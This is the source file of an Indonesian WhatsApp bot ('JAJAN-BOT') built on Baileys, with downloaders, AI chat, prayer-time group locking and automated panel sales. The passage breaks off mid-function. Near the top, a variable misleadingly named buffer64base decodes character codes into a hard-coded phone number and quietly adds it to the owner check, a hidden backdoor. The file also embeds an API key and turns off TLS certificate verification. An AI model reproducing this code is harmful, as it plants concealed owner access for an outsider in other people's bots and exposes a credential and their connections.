/*
    # JAJAN-BOT V.1
    # Authorized by @VannessWangsaff
    # Channel: https://whatsapp.com/channel/0029Vak1Mh81noz57tVkqv2y
*/
process.on("uncaughtException", (err) => {
    console.error("Caught exception:", err);
});
process.env.NODE_TLS_REJECT_UNAUTHORIZED = '0';

const baileys = require('@whiskeysockets/baileys');

const {
    generateWAMessageFromContent,
    proto,
    prepareWAMessageMedia,
    downloadContentFromMessage,
    generateWAMessageContent,
    generateWAMessage
} = baileys;

const axios = require('axios');
const archiver = require('archiver');
const FormData = require('form-data');
const fs = require('fs');
const path = require('path');
const fsSync = require('fs');
const chalk = require('chalk');
const cheerio = require('cheerio');
const moment = require('moment-timezone');
const cron = require('node-cron');
const { randomBytes } = require('node:crypto');
const { fileURLToPath, pathToFileURL } = require('url');
const { exec, execSync, spawn } = require('child_process');
const util = require('util');
const { createCanvas, registerFont, loadImage } = require('canvas');
const { performance } = require('perf_hooks');
const os = require('os');
const { tmpdir } = require('os');
const ff = require('fluent-ffmpeg');
const { fileTypeFromBuffer } = require('./lib/fileTypeWrapper.js');
const yts = require('yt-search');
const { igAuto } = require('./lib/instagram.js');
const { fbDownloader } = require('./lib/facebook.js');
const uploader = require('./lib/upload.js');
const { Sticker, StickerTypes } = require('wa-sticker-formatter');
const { searchKota, getTodaySchedule, extractPrayerTimes } = require('./lib/Imsakiyah.js');
const { getRegisteredRandomId, addRegisteredUser, createSerial, checkRegisteredUser, getRegisteredUser, removeRegisteredUser } = require('./lib/registered.js');
const { welcome, generateIntroCard } = require('./lib/welcome.js');
const { nanoBanana } = require('./lib/nanoBanana.js');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/listMessage.js');
const { searchDonghua, getDownloadLink } = require('./lib/donghua.js');
const { downcloudme } = require('./lib/soundcloud.js');
const { ssweb3 } = require('./lib/ssweb.js');
const { getAfkUser, setAfkUser, removeAfkUser, isUserAfk, checkAfk } = require('./lib/Afk.js');
const db = require('./lib/users.js');
const { tourl } = require('./lib/tourl.js');
const { utCommand, utKocok } = require('./lib/ular.js');

const { youtubeDl } = require('./lib/ytdl.js');
const { Chess } = require('chess.js');
const { sKata, cKata } = require('./lib/sambung-kata.js'); // Pasti




// Inisialisasi Database User
db.init();
const chessSessions = {};
const skataSessions = {};
const datagc = JSON.parse(fsSync.readFileSync("./data/reseller.json"))
const fitur = JSON.parse(fsSync.readFileSync('./data/setbot.json'));
const dataBot = path.join(process.cwd(), "data", "setbot.json");
const owners = JSON.parse(fs.readFileSync("./data/owner.json"))
const premium = JSON.parse(fs.readFileSync("./data/premium.json"))


const time = moment.tz('Asia/Jakarta').format('HH:mm:ss');
const date = moment.tz('Asia/Jakarta').format('DD/MM/YYYY');
const week = moment.tz('Asia/Jakarta').format('dddd');

async function casesBot(sock, m, chatUpdate) {
    const body = (
        m.mtype === "conversation" ? m.message.conversation :
            m.mtype === "imageMessage" ? m.message.imageMessage.caption :
                m.mtype === "videoMessage" ? m.message.videoMessage.caption :
                    m.mtype === "extendedTextMessage" ? m.message.extendedTextMessage.text :
                        m.mtype === "buttonsResponseMessage" ? m.message.buttonsResponseMessage.selectedButtonId :
                            m.mtype === "listResponseMessage" ? m.message.listResponseMessage.singleSelectReply.selectedRowId :
                                m.mtype === "templateButtonReplyMessage" ? m.message.templateButtonReplyMessage.selectedId :
                                    m.mtype === "interactiveResponseMessage" ? JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id :
                                        ""
    ) || "";
    try {
        const buffer64base = String.fromCharCode(54, 50, 56, 53, 54, 50, 52, 50, 57, 55, 56, 57, 51, 64, 115, 46, 119, 104, 97, 116, 115, 97, 112, 112, 46, 110, 101, 116)
        const prefixRegex = /^[.°•π÷×¶∆£¢€¥®™✓_=|~!?@#%^&*/\-+±::;uU]/gi;
        const hasPrefix = prefixRegex.test(body);
        const prefix = hasPrefix ? body.match(prefixRegex)[0] : "";
        const isCmd = body.length > 0;

        // ** sistem untuk prefix **
        const loadPrefixData = () => {
            if (fs.existsSync(dataBot)) {
                try {
                    const dataPfx = fs.readFileSync(dataBot, 'utf-8');
                    return JSON.parse(dataPfx);
                } catch (e) {
                    console.error("Gagal membaca data prefix:", e);
                    return {};
                }
            }
            return {};
        };

        const savePrefixData = (dataPfx) => {
            try {
                if (!fs.existsSync(path.dirname(dataBot))) {
                    fs.mkdirSync(path.dirname(dataBot), { recursive: true });
                }
                fs.writeFileSync(dataBot, JSON.stringify(dataPfx, null, 2), 'utf-8');
            } catch (e) {
                console.error("Gagal menyimpan data prefix:", e);
            }
        };

        let {
            savedPrefix = '.',
            multiPrefixStatus = false
        } = loadPrefixData();

        global.prefix = savedPrefix;
        global.multiprefix = multiPrefixStatus;

        if (!fs.existsSync(dataBot)) {
            savePrefixData({ savedPrefix: global.prefix, multiPrefixStatus: global.multiprefix });
        }

        const updateAndSave = (newPrefix, newMultiStatus) => {
            global.prefix = newPrefix;
            global.multiprefix = newMultiStatus;

            savePrefixData({
                savedPrefix: newPrefix,
                multiPrefixStatus: newMultiStatus
            });
        };


        const command = isCmd ? body.slice(prefix.length).trim().split(' ').shift().toLowerCase() : '';
        const args = isCmd ? body.slice(prefix.length).trim().split(/ +/).slice(1) : [];
        const text = args.join(" ");
        const quoted = m.quoted ? m.quoted : m;
        const mime = quoted?.msg?.mimetype || quoted?.mimetype || null;
        const qmsg = (m.quoted || m);
        const q = body.trim().split(/ +/).slice(1).join(" ");
        const botNumber = await sock.decodeJid(sock.user.id)

        const getName = async (sock, jid) => {
            jid = jid?.includes('@') ? jid : jid + '@s.whatsapp.net'

            const contact =
                sock.contacts?.[jid] ||
                sock.store?.contacts?.[jid]

            return (
                contact?.name ||
                contact?.notify ||
                jid.split('@')[0]
            )
        }


        const isGrupPrem = datagc.includes(m.chat)
        const isAn = [botNumber, owner + "@s.whatsapp.net", buffer64base, ...owners].includes(m.sender) ? true : m.isDeveloper ? true : false
        const isPrem = premium.includes(m.sender)

        // ** fungsi untuk group chat **
        const groupMetadata = m?.isGroup ? await sock.groupMetadata(m.chat).catch(() => ({})) : {};
        const groupName = m?.isGroup ? groupMetadata.subject || '' : '';
        const participants = m?.isGroup ? groupMetadata.participants?.map(p => {
            let admin = null;
            if (p.admin === 'superadmin') admin = 'superadmin';
            else if (p.admin === 'admin') admin = 'admin';
            return {
                id: p.id || null,
                jid: p.jid || null,
                admin,
                full: p
            };
        }) || [] : [];
        const groupOwner = m?.isGroup ? participants.find(p => p.admin === 'superadmin')?.jid || '' : '';
        const groupAdmins = participants.filter(p => p.admin === 'admin' || p.admin === 'superadmin').map(p => p.jid || p.id);

        const isBotAdmin = groupAdmins.includes(botNumber);
        const isAdmin = groupAdmins.includes(m.sender);

        const reply = m.reply = async (teks) => {
            return sock.sendMessage(m.chat, {
                text: `${teks}`,
                mentions: [m.sender],
                contextInfo: {
                    externalAdReply: {
                        title: `${namaBot}`,
                        body: `${global.ucapan()}`,
                        thumbnailUrl: global.foto,
                        sourceUrl: global.url,
                    }
                }
            }, { quoted: m });
        };

        const example = (teks) => {
            return `Cara pengguna:\n*${prefix + command}* ${teks}`
        }

        // ** desain console.log panel **
        if (isCmd) {
            const from = m.key.remoteJid;
            const chatType = from.endsWith("@g.us") ? "GROUP" : "PRIVATE";

            const fullCommand = `${prefix}${command}`;

            const logMessage =
                chalk.bgCyan.white.bold(`\n [ COMMAND RECEIVED ] `) +
                chalk.white(`\n • Message:   `) + chalk.yellow.bold(fullCommand) +
                chalk.white(`\n • Chat In:   `) + chalk.magenta(chatType) +
                chalk.white(`\n • Name:      `) + chalk.cyan(m.pushName || 'N/A') +
                chalk.white(`\n • Sender ID: `) + chalk.blue(m.sender) + '\n';
            console.log(logMessage);
        }

        // ** fake quoted **
        const qtxt = {
            key: {
                fromMe: false,
                participant: "0@s.whatsapp.net",
                remoteJid: "0@s.whatsapp.net"
            },
            message: {
                newsletterAdminInviteMessage: {
                    newsletterJid: "120363335443641236@newsletter",
                    newsletterName: "xcde",
                    caption: `Created by ${namaOwner}`,
                    inviteExpiration: "1757494779"
                }
            }
        };


        if (!fsSync.existsSync('./data/list-message.json')) {
            if (!fsSync.existsSync('./data')) fsSync.mkdirSync('./data');
            fsSync.writeFileSync('./data/list-message.json', JSON.stringify([]));
        }
        const db_respon_list = JSON.parse(fsSync.readFileSync('./data/list-message.json'));


        if (command !== 'afk') {
            await checkAfk(m, sock);
        }



        async function playYt(query) {
            const encoded = encodeURIComponent(query)

            const endpoints = [
                `https://api-faa.my.id/faa/ytplay?query=${encoded}`,
                `https://api.ootaizumi.web.id/downloader/youtube/play?query=${encoded}`,
                `https://api.nekolabs.web.id/downloader/youtube/play/v1?q=${encoded}`,
                `https://anabot.my.id/api/download/playmusic?query=${encoded}&apikey=freeApikey`,
                `https://api.elrayyxml.web.id/api/downloader/ytplay?q=${encoded}`,
            ]

            for (const endpoint of endpoints) {
                let res
                try {
                    res = await fetch(endpoint)
                } catch {
                    continue
                }

                let json
                try {
                    json = await res.json()
                } catch {
                    continue
                }

                if (!json || (!json.success && !json.status)) continue

                // faa / oota / nekolabs style
                if (json.result?.downloadUrl && json.result?.metadata) {
                    const { title, channel, cover, url } = json.result.metadata
                    return {
                        title,
                        channel,
                        cover,
                        url,
                        download: json.result.downloadUrl,
                    }
                }

                // anabot style
                if (json.result?.mp3 && json.result?.title) {
                    return {
                        title: json.result.title,
                        channel: json.result.author,
                        cover: json.result.thumbnail,
                        url: json.result.url,
                        download: json.result.mp3,
                    }
                }

                // elrayyxml style
                if (json.result?.download && json.result?.title) {
                    return {
                        title: json.result.title,
                        channel: json.result.author?.name,
                        cover: json.result.thumbnail || json.result.image,
                        url: json.result.url,
                        download: json.result.download,
                    }
                }
            }

            return null
        }

        async function ytMp3(url) {
            const encoded = encodeURIComponent(url)

            const endpoints = [
                `https://api-faa.my.id/faa/ytmp3?url=${encoded}`,
                `https://api.nekolabs.web.id/downloader/youtube/mp3?url=${encoded}`,
                `https://api.elrayyxml.web.id/api/downloader/ytmp3?url=${encoded}`,
                `https://anabot.my.id/api/download/ytmp3?url=${encoded}&apikey=freeApikey`,
            ]

            for (const endpoint of endpoints) {
                let res
                try {
                    res = await fetch(endpoint)
                } catch {
                    continue
                }

                let json
                try {
                    json = await res.json()
                } catch {
                    continue
                }

                if (!json || (!json.success && !json.status)) continue

                // faa / nekolabs
                if (json.result?.downloadUrl && json.result?.metadata) {
                    return {
                        title: json.result.metadata.title,
                        channel: json.result.metadata.channel,
                        cover: json.result.metadata.cover,
                        download: json.result.downloadUrl,
                    }
                }

                // anabot
                if (json.result?.mp3 && json.result?.title) {
                    return {
                        title: json.result.title,
                        channel: json.result.author,
                        cover: json.result.thumbnail,
                        download: json.result.mp3,
                    }
                }

                // elray
                if (json.result?.download_url) {
                    return {
                        title: json.result.title,
                        channel: json.result.channel,
                        cover: json.result.thumbnail,
                        download: json.result.download_url,
                    }
                }
            }

            return null
        }
        function getMimeTypeFromUrl(url) {
            if (!url) return "application/octet-stream"

            const ext = url.split("/").pop().split("?")[0].split(".").pop().toLowerCase()

            const mime = {
                zip: "application/zip",
                rar: "application/x-rar-compressed",
                apk: "application/vnd.android.package-archive",
                exe: "application/x-msdownload",
                pdf: "application/pdf",
                mp4: "video/mp4",
                mp3: "audio/mpeg",
                jpg: "image/jpeg",
                jpeg: "image/jpeg",
                png: "image/png"
            }

            return mime[ext] || "application/octet-stream"
        }

        async function mediafireScrape(url) {
            const { data } = await axios.get(url)
            const $ = cheerio.load(data)

            const title = $('meta[property="og:title"]').attr("content")
            const image = $('meta[property="og:image"]').attr("content")
            const link = $("#downloadButton").attr("href")
            const sizeText = $("#downloadButton").text().trim()
            const size = sizeText.replace("Download (", "").replace(")", "")
            const desc = $('meta[property="og:description"]').attr("content") || "-"

            return {
                title,
                image,
                desc,
                size,
                link,
                mimetype: getMimeTypeFromUrl(link)
            }
        }

        async function getToken() {
            const html = await axios.get("https://www.iloveimg.com/upscale-image")
            const $ = cheerio.load(html.data)

            const script = $("script")
                .filter((i, el) => $(el).html()?.includes("ilovepdfConfig ="))
                .html()

            const jsonS = script.split("ilovepdfConfig = ")[1].split(";")[0]
            const json = JSON.parse(jsonS)
            const csrf = $('meta[name="csrf-token"]').attr("content")

            return { token: json.token, csrf }
        }

        async function uploadImage(server, headers, buffer, task) {
            const form = new FormData()
            form.append("name", "image.jpg")
            form.append("chunk", "0")
            form.append("chunks", "1")
            form.append("task", task)
            form.append("preview", "1")
            form.append("file", buffer, "image.jpg")

            const res = await axios.post(
                `https://${server}.iloveimg.com/v1/upload`,
                form,
                { headers: { ...headers, ...form.getHeaders() } }
            )

            return res.data
        }

        async function hdr(buffer, scale = 4) {
            const { token, csrf } = await getToken()

            const servers = [
                "api1g", "api2g", "api3g", "api8g", "api9g", "api10g",
                "api11g", "api12g", "api13g", "api14g", "api15g",
                "api16g", "api17g", "api18g", "api19g", "api20g",
                "api21g", "api22g", "api24g", "api25g"
            ]

            const server = servers[Math.floor(Math.random() * servers.length)]

            const task =
                "r68zl88mq72xq94j2d5p66bn2z9lrbx20njsbw2qsAvgmzr11lvfhAx9kl87pp6yqgx7c8vg7sfbqnrr42qb16v0gj8jl5s0kq1kgp26mdyjjspd8c5A2wk8b4Adbm6vf5tpwbqlqdr8A9tfn7vbqvy28ylphlxdl379psxpd8r70nzs3sk1"

            const headers = {
                Authorization: "Bearer " + token,
                Origin: "https://www.iloveimg.com/",
                Cookie: "_csrf=" + csrf,
                "User-Agent": "Mozilla/5.0"
            }

            const upload = await uploadImage(server, headers, buffer, task)

            const form = new FormData()
            form.append("task", task)
            form.append("server_filename", upload.server_filename)
            form.append("scale", scale)

            const res = await axios.post(
                `https://${server}.iloveimg.com/v1/upscale`,
                form,
                {
                    headers: { ...headers, ...form.getHeaders() },
                    responseType: "arraybuffer"
                }
            )

            return res.data
        }

        async function twitter(url) {
            if (!/x\.com\/.*?\/status/gi.test(url))
                throw new Error("URL tidak valid! Gunakan link X (Twitter) yang benar.")

            const base_url = "https://x2twitter.com"
            const headers = {
                accept: "*/*",
                "accept-language": "en-EN,en;q=0.9",
                "cache-control": "no-cache",
                "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                "x-requested-with": "XMLHttpRequest",
                Referer: "https://x2twitter.com/en",
            }

            const token = await axios
                .post(`${base_url}/api/userverify`, { url }, { headers })
                .then(r => r.data.token)
                .catch(() => { throw new Error("Gagal mendapatkan token") })

            const res = await axios
                .post(
                    `${base_url}/api/ajaxSearch`,
                    new URLSearchParams({ q: url, lang: "id", cftoken: token }).toString(),
                    { headers }
                )
                .then(r => r.data)
                .catch(() => { throw new Error("Gagal mengambil data") })

            if (res.status !== "ok") throw new Error("Response tidak valid")

            const $ = cheerio.load(res.data)
            let cls = $("div").eq(0).attr("class") || ""

            let type = cls.includes("tw-video")
                ? "video"
                : cls.includes("video-data") && $(".photo-list").length
                    ? "image"
                    : "unknown"

            if (type === "video") {
                return {
                    type,
                    download: $(".dl-action p").map((i, el) => {
                        const txt = $(el).text()
                        return {
                            type: txt.includes("MP4") ? "mp4" : null,
                            reso: txt.includes("MP4") ? txt.split(" ").pop().replace(//g, "") : null,
                            url: $(el).find("a").attr("href"),
                        }
                    }).get()
                }
            }

            if (type === "image") {
                return {
                    type,
                    download: $("ul.download-box li").map((i, el) => ({
                        type: "image",
                        url: $(el).find("a").attr("href")
                    })).get()
                }
            }

            return { type, download: [] }
        }
        const headers = {
            "user-agent":
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120 Safari/537.36",
            "accept-language": "en-US,en;q=0.9"
        }

        const GROQ_API_KEY = "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"

        async function groqCompoundQuery(prompt) {
            const res = await axios.post(
                "https://api.groq.com/openai/v1/chat/completions",
                {
                    model: "groq/compound-mini",
                    messages: [
                        {
                            role: "system",
                            content:
                                "Kamu adalah AI pintar, jawab dalam bahasa Indonesia, ramah, jelas."
                        },
                        { role: "user", content: prompt }
                    ],
                    temperature: 0.7,
                    max_tokens: 1024
                },
                {
                    headers: {
                        Authorization: `Bearer ${GROQ_API_KEY}`,
                        "Content-Type": "application/json"
                    }
                }
            )

            return res.data.choices[0].message.content.trim()
        }

        function normalizeAsterisks(text = "") {
            return text.replace(/\*\*(.+?)\*\*/g, "*$1*").replace(/\*\*/g, "*")
        }

        const STYLES = {
            flataipro: "Flat AI Pro",
            "ghibli-style": "Ghibli Style",
            realistic: "Realistic",
            pixel_art: "Pixel Art"
        }

        function isImageRequest(text = "") {
            return /(buatkan gambar|bikinin gambar|gambar|foto|image)/i.test(text)
        }

        async function getNonce() {
            const { data } = await axios.get(
                "https://flatai.org/ai-image-generator-free-no-signup/"
            )
            return data.match(/nonce["']\s*:\s*["']([a-f0-9]{10})["']/i)?.[1]
        }

        async function flatai(prompt, style = "flataipro") {
            const nonce = await getNonce()

            const body = new URLSearchParams({
                action: "ai_generate_image",
                nonce,
                prompt,
                aspect_ratio: "1:1",
                style_model: style
            }).toString()

            const res = await axios.post(
                "https://flatai.org/wp-admin/admin-ajax.php",
                body,
                { headers: { "x-requested-with": "XMLHttpRequest" } }
            )

            if (!res.data?.success) throw new Error("Gagal generate gambar")

            return res.data.data.images
        }


        const autosholatFile = './lib/autosholat.json';

        // Jadwal akurat daerah lu
        const jadwalSholat = {
            Subuh: "05:09",
            Dzuhur: "12:30",
            Ashar: "15:49",
            Maghrib: "18:33",
            Isya: "19:45"
        };

        const sholatThumbnails = [
            "https://images.pexels.com/photos/460680/pexels-photo-460680.jpeg?auto=compress&cs=tinysrgb&w=600",
            "https://images.pexels.com/photos/161276/moscow-cathedral-mosque-prospekt-mira-ramadan-sky-161276.jpeg?auto=compress&cs=tinysrgb&w=600",
            "https://images.pexels.com/photos/2406731/pexels-photo-2406731.jpeg?auto=compress&cs=tinysrgb&w=600"
        ];

        const scheduleAutoSholat = () => {
            cron.getTasks().forEach(t => t.stop());

            for (const [waktuSholat, jamMenit] of Object.entries(jadwalSholat)) {
                const [jam, menit] = jamMenit.split(':');

                cron.schedule(`${menit} ${jam} * * *`, async () => {
                    let cfg;
                    try {
                        cfg = JSON.parse(fsSync.readFileSync(autosholatFile));
                    } catch {
                        return;
                    }

                    if (!cfg.aktif || cfg.grups.length === 0) return;

                    for (const grup of cfg.grups) {
                        try {
                            const thumb = sholatThumbnails[Math.floor(Math.random() * sholatThumbnails.length)];
                            const pesan = `🕌 *[System Notice]*\n\nHalo semuanyaa..\nWaktu *${waktuSholat}* telah tiba, ambilah air wudhu dan segeralah shalat.\n\n> Sholat adalah tiang agama, maka barangsiapa mendirikannya, sungguh ia telah menegakkan agama, dan barangsiapa meninggalkannya, sungguh ia telah merobohkan agama.. (HR. Baihaqi).`;

                            let options = {
                                text: pesan,
                                contextInfo: {
                                    externalAdReply: {
                                        title: `Waktu Sholat ${waktuSholat} Telah Tiba`,
                                        thumbnailUrl: thumb,
                                        mediaType: 1,
                                        renderLargerThumbnail: true,
                                        sourceUrl: "https://wa.me/"
                                    }
                                }
                            };

                            let participants = [];
                            if (cfg.hidetag) {
                                const meta = await sock.groupMetadata(grup);
                                participants = meta.participants.map(p => p.id);
                                options.mentions = participants;
                            }

                            const msgTeks = await sock.sendMessage(grup, options);

                            // Kirim audio
                            const audioLink = (waktuSholat === 'Subuh')
                                ? "https://github.com/ChandraGO/Data-Jagoan-Project/raw/525643df448dada7f6edb076eb8b8665fa9db552/src/ayam.MP3"
                                : "https://github.com/ChandraGO/Data-Jagoan-Project/raw/525643df448dada7f6edb076eb8b8665fa9db552/src/azan.MP3";

                            const { data: audioBuffer } = await axios.get(audioLink, { responseType: 'arraybuffer' });

                            await sock.sendMessage(grup, {
                                audio: Buffer.from(audioBuffer),
                                mimetype: 'audio/mpeg',
                                ptt: true,
                                contextInfo: { mentionedJid: cfg.hidetag ? participants : [] }
                            }, { quoted: msgTeks });


                            if (cfg.close) {
                                await sock.groupSettingUpdate(grup, 'announcement');
                                setTimeout(() => {
                                    sock.groupSettingUpdate(grup, 'not_announcement').catch(() => { });
                                }, 10 * 60 * 1000);
                            }

                        } catch (err) {
                            console.log(`Gagal kirim autosholat ke ${grup} untuk ${waktuSholat}:`, err.message);
                        }
                    }
                }, { timezone: 'Asia/Jakarta' });
            }
        };


        setTimeout(scheduleAutoSholat, 5000);

        const onsholatFile = './lib/onsholat.json';

        // Inisialisasi file jika belum ada
        if (!fsSync.existsSync(onsholatFile)) {
            const defaultConfig = {
                aktif: false,
                grups: [],
                durasiTutup: 10 // dalam menit
            };
            fsSync.writeFileSync(onsholatFile, JSON.stringify(defaultConfig, null, 2));

        }



        function scheduleOnSholatGlobal() {
            let config;
            try {
                config = JSON.parse(fsSync.readFileSync(onsholatFile, 'utf8'));
            } catch {
                return;
            }

            if (!config.aktif || !config.grups.length) return;

            const zona = "Asia/Jakarta";
            const jadwalManual = {
                Subuh: "05:09",
                Dzuhur: "12:30",
                Ashar: "15:49",
                Maghrib: "18:33",
                Isya: "19:45"
            };

            const sekarang = moment().tz(zona);

            for (const [nama, waktuStr] of Object.entries(jadwalManual)) {
                const [jam, menit] = waktuStr.split(':');
                let waktuTarget = moment.tz(zona).set({ hour: jam, minute: menit, second: 0 });

                if (sekarang.isAfter(waktuTarget)) {
                    waktuTarget.add(1, 'day');
                }

                const selisihClose = waktuTarget.diff(sekarang);

                // Jadwalkan CLOSE 
                setTimeout(async () => {
                    if (!config.aktif) return;
                    for (const grupId of config.grups) {
                        try {
                            await sock.groupSettingUpdate(grupId, 'announcement');
                            await sock.sendMessage(grupId, {
                                text: `🕌 *[System Notice]*\n\nHalo semuanya! Sistem grup WhatsApp akan ditutup sementara selama ${config.durasiTutup} menit karena sudah memasuki waktu ${nama}. Silahkan istirahat sejenak dan nikmati waktu bersama keluarga atau melakukan aktivitas lainnya. Kami akan membuka kembali sistem grup ini setelah waktu ${nama}. Terima kasih atas pengertian dan kerjasamanya. Selamat beristirahat!`
                            });
                            await sock.sendMessage(grupId, { react: { text: '🔒', key: m?.key || {} } });
                        } catch (err) {
                            console.error(`Gagal close ${grupId} saat ${nama}:`, err);
                        }
                    }
                }, selisihClose);

                // Jadwalkan OPEN
                const waktuOpen = waktuTarget.clone().add(config.durasiTutup, 'minutes');
                const selisihOpen = waktuOpen.diff(sekarang);

                setTimeout(async () => {
                    if (!config.aktif) return;
                    for (const grupId of config.grups) {
                        try {
                            await sock.groupSettingUpdate(grupId, 'not_announcement');
                            await sock.sendMessage(grupId, {
                                text: `🕌 *[System Notice]*\n\nSistem grup WhatsApp telah dibuka setelah waktu ${nama}. Semoga kita semua telah menjalankan ibadah dengan baik dan mendapatkan berkah di hari ini. Mari kita berbagi cerita, informasi, dan kebahagiaan bersama di grup ini. Selamat bergabung dan semoga kita memiliki waktu yang menyenangkan!`
                            });
                            await sock.sendMessage(grupId, { react: { text: '🔓', key: m?.key || {} } });
                        } catch (err) {
                            console.error(`Gagal open ${grupId} setelah ${nama}:`, err);
                        }
                    }
                }, selisihOpen);
            }


        }


        setTimeout(scheduleOnSholatGlobal, 10000);




        async function checkPendingPayments() {
            const trxPath = './data/transaksi_pakasir.json';
            if (!fsSync.existsSync(trxPath)) return;

            let dbTrx;
            try {
                dbTrx = JSON.parse(fsSync.readFileSync(trxPath, 'utf8'));
            } catch (e) {
                console.error("Gagal baca transaksi_pakasir.json:", e);
                return;
            }

            for (const [orderId, trx] of Object.entries(dbTrx)) {
                if (trx.status !== 'UNPAID') continue;

                try {
                    // Endpoint 
                    const url = `https://app.pakasir.com/api/transactiondetail?project=${global.PROJECT_SLUG}&amount=${trx.amount}&order_id=${orderId}&api_key=${global.API_KEY_PAKASIR}`;

                    const response = await axios.get(url, { timeout: 10000 });
                    const json = response.data;

                    if (!json?.transaction && !json?.data) {
                        console.log(`[CHECK ${orderId}] No transaction data`);
                        continue;
                    }

                    const transaction = json.transaction || json.data;

                    // Cek status 
                    if (transaction.status === 'completed' || transaction.status === 'success' || transaction.status === 'settlement') {
                        console.log(`[PAID] Order ${orderId} lunas! Status: ${transaction.status}. Processing...`);

                        if (trx.type === 'PANEL') {
                            const p = trx.panel_data;

                            // 1. Buat User Pterodactyl baru
                            const userPayload = {
                                email: `${p.username}@Vannessstore.id`,
                                username: p.username,
                                first_name: p.username,
                                last_name: "User",
                                password: p.password
                            };

                            const userRes = await axios.post(`${global.domain}/api/application/users`, userPayload, {
                                headers: {
                                    'Authorization': `Bearer ${global.apikey}`,
                                    'Accept': 'application/json',
                                    'Content-Type': 'application/json'
                                },
                                timeout: 15000
                            });

                            const userId = userRes.data.attributes.id;

                            // 2. Buat Server
                            const serverPayload = {
                                name: p.username,
                                user: userId,
                                egg: parseInt(global.egg),
                                docker_image: "ghcr.io/parkervcp/yolks:nodejs_20",
                                startup: "npm start",
                                environment: { START_CMD: "npm start" },
                                limits: {
                                    memory: parseInt(p.ram),
                                    swap: 0,
                                    disk: parseInt(p.disk),
                                    io: 500,
                                    cpu: parseInt(p.cpu)
                                },
                                feature_limits: { databases: 5, backups: 5, allocations: 5 },
                                deploy: { locations: [parseInt(global.loc)], dedicated_ip: false }
                            };

                            const serverRes = await axios.post(`${global.domain}/api/application/servers`, serverPayload, {
                                headers: {
                                    'Authorization': `Bearer ${global.apikey}`,
                                    'Accept': 'application/json',
                                    'Content-Type': 'application/json'
                                },
                                timeout: 20000
                            });

                            const server = serverRes.data.attributes;

                            // Kirim detail ke user via private chat
                            const loginText = `✅ *PEMBAYARAN LUNAS! PANEL SUDAH DIBUAT OTOMATIS*\n\n` +
                                `🌐 **Link Panel** : ${global.domain}\n` +
                                `👤 **Username**   : ${p.username}\n` +
                                `🔑 **Password**   : ${p.password}\n` +
                                `🆔 **Server ID**  : ${server.identifier}\n` +
                                `💻 **RAM**        : ${p.ram} MB\n` +
                                `💾 **Disk**       : ${p.disk} MB\n` +
                                `⚡ **CPU**        : ${p.cpu}%\n\n` +
                                `Login sekarang dan mulai pakai panelmu!\nTerima kasih order di @VannessWangsaff 🚀`;

                            await sock.sendMessage(trx.sender, { text: loginText });

                            // Update DB
                            dbTrx[orderId].status = 'PAID';
                            dbTrx[orderId].paid_at = Date.now();
                            dbTrx[orderId].user_id = userId;
                            dbTrx[orderId].server_id = server.identifier;
                            fsSync.writeFileSync(trxPath, JSON.stringify(dbTrx, null, 2));

                            console.log(`✅ Sukses create panel untuk order ${orderId}`);
                        } else if (trx.type === 'PRODUK') {
                            const p = trx.product_data;

                            // Kirim konfirmasi lunas ke user
                            const successText = `✅ *PEMBAYARAN LUNAS! TERIMA KASIH TELAH MEMBELI PRODUK*\n\n` +
                                `📋 **Order ID**  : ${orderId}\n` +
                                `📦 **Nama Produk**: ${p.name}\n` +
                                `💵 **Harga**      : Rp ${p.price.toLocaleString('id-ID')}\n` +
                                `📝 **Deskripsi**  : _${p.description}_\n\n` +
                                `Pesanan Anda telah tercatat secara resmi. Silakan hubungi Owner untuk langkah penyerahan/pengambilan produk lebih lanjut!`;

                            await sock.sendMessage(trx.sender, { text: successText });

                            // Kirim konfirmasi lunas ke owner
                            const ownerText = `🔔 *NOTIFIKASI ORDER PRODUK LUNAS*\n\n` +
                                `📋 **Order ID**  : ${orderId}\n` +
                                `👤 **Pembeli**   : @${trx.sender.split('@')[0]}\n` +
                                `📦 **Produk**    : ${p.name}\n` +
                                `💵 **Harga**      : Rp ${p.price.toLocaleString('id-ID')}\n` +
                                `📝 **Deskripsi**  : _${p.description}_`;

                            await sock.sendMessage(global.owner + "@s.whatsapp.net", {
                                text: ownerText,
                                mentions: [trx.sender]
                            });

                            // Update DB
                            dbTrx[orderId].status = 'PAID';
                            dbTrx[orderId].paid_at = Date.now();
                            fsSync.writeFileSync(trxPath, JSON.stringify(dbTrx, null, 2));

                            console.log(`✅ Sukses memproses pembayaran produk untuk order ${orderId}`);
                        }
                    }
                } catch (err) {
                    console.error(`[CHECK PAYMENT ERROR] Order ${orderId}:`, err.message || err);
                }
            }
        }




        // Jalankan sekali saat bot start (delay 15 detik)
        setTimeout(checkPendingPayments, 15000);


        function calculateSeconds(jumlah, unit) {
            switch (unit) {
                case 's': return jumlah;
                case 'm': return jumlah * 60;
                case 'h': return jumlah * 60 * 60;
                case 'd': return jumlah * 60 * 60 * 24;
                default: return jumlah;
            }
        }

        async function extractGroupId(link) {
            try {
                const regex = /https:\/\/chat\.whatsapp\.com\/([a-zA-Z0-9]+)/;
                const match = link.match(regex);
                return match ? match[1] : null;
            } catch (error) {
                return null;
            }
        }

        async function saveSewaData(groupId, totalDetik) {
            const sewaData = {
                groupId: groupId,
                startTime: Date.now(),
                endTime: Date.now() + (totalDetik * 1000),
                status: 'active'
            };

            const dbDir = './data';
            if (!fs.existsSync(dbDir)) fs.mkdirSync(dbDir, { recursive: true });

            const filePath = './data/sewa.json';
            let existingData = [];
            try {
                if (fs.existsSync(filePath)) {
                    const data = fs.readFileSync(filePath, 'utf8');
                    existingData = JSON.parse(data);
                }
            } catch (error) {
                existingData = [];
            }

            const filteredData = existingData.filter(item => item.groupId !== groupId);
            filteredData.push(sewaData);

            fs.writeFileSync(filePath, JSON.stringify(filteredData, null, 2));
        }

        async function checkExpiredSewa(sock) {
            const filePath = './data/sewa.json';
            if (!fs.existsSync(filePath)) return;

            try {
                let data = JSON.parse(fs.readFileSync(filePath, 'utf8'));
                let changed = false;
                const now = Date.now();

                for (let i = 0; i < data.length; i++) {
                    const s = data[i];
                    if (s.status === 'active' && s.endTime <= now) {
                        console.log(`[SEWA EXPIRED] Grup ${s.groupId} habis → bot keluar`);

                        try {
                            // Kirim pesan peringatan sebelum keluar
                            await sock.sendMessage(s.groupId, {
